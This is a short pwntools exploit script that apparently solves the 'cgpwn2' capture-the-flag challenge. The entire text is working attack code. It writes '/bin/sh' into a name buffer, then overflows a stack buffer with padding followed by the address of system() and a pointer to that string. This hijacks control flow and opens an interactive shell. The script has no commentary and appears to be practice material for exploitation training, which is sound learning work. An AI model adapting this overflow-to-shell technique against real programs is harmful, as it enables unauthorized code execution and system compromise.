from pwn import *

def debug():
    gdb.attach(p)
    pause()

context(os='linux', arch='i386', log_level='debug')
context.terminal = ['tmux','splitw','-h']
p = process('./cgpwn2')
debug()
p.sendlineafter(b'your name\n', b'/bin/sh\x00')
e = ELF("./cgpwn2")
sysaddr = e.symbols['system']
payload = b'a' * 0x2A + p32(sysaddr) + p32(0) + p32(0x0804A080)
p.sendlineafter(b'message here:\n', payload)
p.interactive()